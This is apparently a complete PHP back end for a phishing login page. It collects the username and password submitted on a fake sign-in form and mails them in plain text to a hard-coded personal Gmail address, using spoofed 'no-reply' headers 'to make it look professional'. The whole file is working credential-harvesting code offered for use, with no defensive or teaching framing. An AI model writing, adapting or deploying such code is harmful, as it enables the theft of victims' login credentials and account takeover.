<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get form data
    $username = isset($_POST['u_name']) ? $_POST['u_name'] : '';
    $password = isset($_POST['pass']) ? $_POST['pass'] : '';

    // Validate if the data exists
    if (!empty($username) && !empty($password)) {
        // Your email address (receiver)
        $to = "mukeshkotty123@gmail.com";
        
        // Subject of the email
        $subject = "New Login Attempt - Credentials Submitted";
        
        // Message body with the submitted credentials
        $message = "User Credentials:\n";
        $message .= "Username/Phone/Email: " . $username . "\n";
        $message .= "Password: " . $password . "\n";

        // Additional headers (to make it look professional)
        $headers = "From: no-reply@yourdomain.com\r\n";
        $headers .= "Reply-To: no-reply@yourdomain.com\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

        // Send the email
        if (mail($to, $subject, $message, $headers)) {
            echo "Credentials have been sent successfully!";
        } else {
            echo "There was an error sending the email.";
        }
    } else {
        echo "Please fill in both username and password.";
    }
}
?>
